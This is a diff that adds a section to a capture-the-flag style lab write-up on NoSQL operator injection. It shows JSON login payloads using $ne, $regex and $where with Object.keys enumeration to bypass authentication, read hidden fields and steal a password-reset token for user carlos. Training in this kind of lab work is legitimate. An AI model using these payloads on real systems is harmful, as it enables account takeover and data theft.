@@ -57,3 +57,46 @@ Run script to solve the lab:
 ```
 python exfil-password.py 
 ```
+
+## Exploiting NoSQL operator injection to extract unknown fields
+
+Firstly during testing I have triggered the password reset for carlos.
+
+At `POST /login` request adding `$where` caluse results in 500 response error, so we can assume there maybe inproper handling of the input from user
+
+```
+{"username":"carlos","password":"password",
+"$where":1}
+```
+
+But injecting operators as shown below with objects did the trick:
+
+```
+{"username":"carlos","password":{"$ne": ""}}
+
+{"username":"carlos","password":{"$regex": ".*"}}
+```
+
+We can now see a message `Account locked`.
+
+Now adding `$where` clause and changing its value from `0` to `1` we receive different respond each time. For `1` - account locked, for `0` - invalid credentials.
+
+```
+{"username":"carlos","password":{"$ne": ""},"$where":"0"}
+
+{"username":"carlos","password":{"$ne": ""},"$where":"1"}
+```
+
+Now using a `Object.keys` we can enumarate object field names and using `match` test them by regex:
+
+```
+{"username":"carlos","password":{"$ne": ""},"$where":"Object.keys(this)[0].match('^.+$')"}
+```
+
+In order to retrieve field names and then reset token value uncomment proper function calls in the script and run:
+
+```
+python exfil-forgot-token.py
+```
+
+`unlockToken` is a field value, so we can try to pass it as param to `/forgot-password` endpoint. Accessing `/forgot-password?unlockToken=a` responds with `"Invalid token"`, so now we can inject a proper one and solve the lab.
